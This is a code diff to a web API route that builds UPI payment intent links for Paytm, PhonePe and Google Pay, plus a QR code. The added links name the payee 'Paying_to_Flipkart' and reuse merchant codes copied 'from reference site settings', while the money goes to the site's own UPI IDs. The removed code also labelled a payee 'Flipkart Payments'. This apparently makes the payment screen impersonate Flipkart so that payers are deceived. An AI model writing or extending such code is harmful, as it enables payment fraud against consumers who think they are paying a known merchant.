@@ -109,28 +109,16 @@ export async function POST(request: Request) {
     // Dynamic QR code URL via free stable QR API
     const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(upiUrl)}&size=220x220`;
 
-    // Paytm Intent Link (uses Paytm UPI ID - upi3)
-    const paytmIntent = `paytmmp://cash_wallet?pa=${paytmUpi}&pn=${encodeURIComponent('Raju Traders')}&am=${Number(amount).toFixed(2)}&cu=INR&tn=${encodeURIComponent(orderNote)}&featuretype=money_transfer`;
+    const orderAmt = Number(amount).toFixed(2);
 
-    // PhonePe Intent Link (uses PhonePe UPI ID - upi2)
-    const phonepeData = {
-      contact: {
-        type: "EXTERNAL_MERCHANT",
-        name: "Flipkart Payments",
-        vpa: phonepeUpi
-      },
-      p2pPaymentCheckoutParams: {
-        note: {
-          type: "text",
-          message: `TXN-${Date.now()}`
-        },
-        initialAmount: Math.round(Number(amount) * 100),
-        checkoutType: "COLLECT",
-        supportedInstruments: -1
-      }
-    };
-    const base64Data = Buffer.from(JSON.stringify(phonepeData)).toString('base64');
-    const phonepeIntent = `phonepe://native?data=${encodeURIComponent(base64Data)}&id=p2ppayment`;
+    // Paytm Intent Link (from reference site settings)
+    const paytmIntent = `paytmmp://cash_wallet?pa=${paytmUpi}&pn=Paying_to_Flipkart&mc=3526&tr=${txnid}&am=${orderAmt}&cu=INR&tn=Recharge&url=&mode=02&purpose=00&orgid=37567`;
+
+    // PhonePe Intent Link (from reference site settings)
+    const phonepeIntent = `phonepe://pay?ver=01&mode=19&pa=${phonepeUpi}&pn=Paying_to_Flipkart&tr=${txnid}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${orderAmt}`;
+
+    // Google Pay (GPay) Intent Link (from reference site settings)
+    const gpayIntent = `tez://upi/pay?pa=${defaultUpi}&pn=Paying_to_Flipkart&mc=3526&tr=${txnid}&am=${orderAmt}&cu=INR&tn=Recharge`;
 
     return NextResponse.json({
       success: true,
@@ -140,6 +128,7 @@ export async function POST(request: Request) {
       qrCodeUrl,
       paytmIntent,
       phonepeIntent,
+      gpayIntent,
       merchantName: storeName,
       upiId: defaultUpi
     });
